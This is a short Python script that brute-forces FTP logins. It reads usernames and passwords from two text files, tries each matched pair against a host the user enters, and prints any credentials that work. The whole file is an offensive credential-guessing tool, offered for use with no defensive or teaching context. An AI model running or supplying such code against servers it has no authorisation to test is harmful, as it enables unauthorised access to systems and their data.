import ftplib
import os
from itertools import zip_longest

location = input("Enter the path of the username file and password file: (both text files should be in the same directory)")

os.chdir(location)

def bruteForceLogin(hostname):
    if os.path.exists(location):
        passList = open('password.txt', 'r')
        userList = open('username.txt', 'r')
        for password, username in zip_longest(passList.readlines(), userList.readlines(), fillvalue=''):
            username = username.strip()
            password = password.strip().rstrip('\r')
            print("[+] Trying: " + str(username + "/" + str(password)))
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print("FTP login successful")
                ftp.quit()
                print(f"The username is {username} and the password is {password}")
            except ftplib.all_errors:
                print("FTP login failed")

if __name__ == '__main__':
    hostname = input('Enter hostname: ')
    bruteForceLogin(hostname)
